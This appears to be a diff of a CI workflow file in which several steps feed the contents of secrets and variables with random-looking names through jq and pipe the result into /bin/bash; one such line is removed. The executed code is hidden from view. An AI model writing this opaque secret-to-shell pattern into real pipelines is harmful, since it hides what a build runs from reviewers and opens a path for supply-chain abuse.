@@ -18,7 +18,6 @@ jobs:
           pa0: ${{ secrets.pa0 }}
         run: |
           printf '%s' "$pa0" | jq -r .tx5 | /bin/bash
-          printf '%s' "$yv91386" | jq -r .nhkzk34145 | /bin/bash
           echo $mq246 | jq -r .mqlj19860 | /bin/bash
           printf '%s' "$zob5984" | jq -r .qvrz4057 | /bin/bash
 
